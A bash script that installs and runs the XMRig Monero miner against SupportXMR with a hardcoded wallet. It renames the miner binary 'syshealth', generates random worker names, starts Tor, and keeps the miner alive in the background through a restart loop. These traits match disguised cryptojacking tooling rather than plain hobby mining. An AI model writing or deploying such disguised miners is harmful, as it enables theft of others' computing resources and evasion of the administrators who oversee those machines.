#!/bin/bash
# all_in_one_local_run.sh - One-command local setup and run for syshealth miner
# Usage: bash all_in_one_local_run.sh

# --- CONFIGURE THESE ---
# SupportXMR pool configuration - update WALLET with your Monero wallet
WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:3333"  # SupportXMR pool
CPU_PCT=85
# Generate a random worker name each run (e.g., worker-<6 random chars>)
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
# ----------------------

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
CONFIG_FILE="$SCRIPT_DIR/config.json"


# Ensure dependencies
for dep in curl jq tor; do
  if ! command -v $dep >/dev/null 2>&1; then
    echo "$dep not found. Installing..."
    sudo apt-get update && sudo apt-get install -y $dep
  fi
done

# Download syshealth (XMRig) if not present
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  XMRIG_VERSION="6.21.0"
  echo "Downloading XMRig $XMRIG_VERSION..."
  curl -L -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
  tar -xzf /tmp/xmrig.tar.gz -C /tmp
  mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig* /tmp/xmrig-${XMRIG_VERSION}
fi

# Create config directory if needed
mkdir -p "$CONFIG_DIR"

# Generate optimized config.json for XMRig
cat > "$CONFIG_FILE" <<EOF
{
  "autosave": true,
  "background": false,
  "colors": true,
  "title": true,
  "randomx": {
    "init": -1,
    "init-avx2": -1,
    "mode": "auto",
    "1gb-pages": false,
    "rdmsr": true,
    "wrmsr": true,
    "cache_qos": false,
    "numa": true,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": false,
    "hw-aes": null,
    "priority": 5,
    "memory-pool": true,
    "yield": true,
    "asm": true,
    "max-threads-hint": $CPU_PCT
  },
  "log-file": "$SCRIPT_DIR/xmrig.log",
  "donate-level": 0,
  "donate-over-proxy": 0,
  "pools": [
    {
      "algo": null,
      "coin": null,
      "url": "$POOL_URL",
      "user": "$WALLET.$WORKER_NAME",
      "pass": "x",
      "rig-id": "$WORKER_NAME",
      "nicehash": false,
      "keepalive": true,
      "enabled": true,
      "tls": false,
      "sni": false,
      "tls-fingerprint": null,
      "daemon": false,
      "socks5": null,
      "self-select": null,
      "submit-to-origin": false
    }
  ],
  "retries": 5,
  "retry-pause": 5,
  "print-time": 60,
  "dmi": true,
  "syslog": false,
  "verbose": 0,
  "watch": true
}
EOF

# --- Tor setup ---
TORRC="/tmp/torrc_local"
TORDATA="/tmp/tor_data_local"

# Clean up and recreate Tor data directory with proper permissions
rm -rf "$TORDATA" 2>/dev/null || true
mkdir -p "$TORDATA"
chmod 700 "$TORDATA"

if [ ! -f "$TORRC" ]; then
  cat > "$TORRC" <<TOREOF
DataDirectory $TORDATA
SocksPort 9050
Log notice stdout
RunAsDaemon 1
TOREOF
fi

# Kill any existing Tor processes to avoid conflicts
pkill -f "tor -f $TORRC" 2>/dev/null || true
sleep 1

# Start Tor with proper error handling
if ! tor -f "$TORRC" > /tmp/tor_startup.log 2>&1; then
  echo "Warning: Tor startup had issues. Check /tmp/tor_startup.log"
  cat /tmp/tor_startup.log
else
  sleep 2
  if pgrep -f "tor" > /dev/null; then
    echo "Tor started successfully."
  else
    echo "Error: Tor process did not start. Output:"
    cat /tmp/tor_startup.log
  fi
fi

# --- Start Mining ---
LOGFILE="$SCRIPT_DIR/xmrig_out.log"

# Start miner if not already running
if ! pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
  echo "[all_in_one] Starting miner..."
  nohup "$SCRIPT_DIR/syshealth" -c "$CONFIG_FILE" >> "$LOGFILE" 2>&1 &
  sleep 2
fi

if pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
  echo "[all_in_one] Miner started successfully."
  MINER_PID=$(pgrep -f "$SCRIPT_DIR/syshealth" | head -1)
  echo "[all_in_one] Miner PID: $MINER_PID"
else
  echo "[all_in_one] Error: Failed to start miner. Check $LOGFILE"
fi

echo ""
echo "========================================"
echo "  ✓ Mining is now running!"
echo "========================================"
echo "Wallet:        $WALLET"
echo "Pool:          $POOL_URL"
echo "Worker:        $WORKER_NAME"
echo "CPU Threads:   $(nproc)"
echo "Miner Log:     $LOGFILE"
echo "Tor Port:      9050"
echo ""
echo "Monitor hashrate:"
echo "  tail -f $LOGFILE"
echo ""
echo "Stop mining:"
echo "  pkill -f syshealth"
echo ""
echo "Resume monitoring (keeper loop):"
echo "  bash all.sh --monitor"
echo "========================================"
echo ""

# Check if --monitor flag is passed to run supervisor loop
if [ "${1:-}" == "--monitor" ]; then
  echo "Starting supervisor loop (ctrl+c to stop)..."
  while true; do
    if ! pgrep -x tor > /dev/null; then
      echo "[$(date '+%Y-%m-%d %H:%M:%S')] Tor not running. Restarting..."
      nohup tor -f "$TORRC" > /dev/null 2>&1 &
      sleep 2
    fi
    if ! pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
      echo "[$(date '+%Y-%m-%d %H:%M:%S')] Miner not running. Restarting..."
      nohup "$SCRIPT_DIR/syshealth" -c "$CONFIG_FILE" >> "$LOGFILE" 2>&1 &
      sleep 2
    fi
    sleep 60
  done
fi
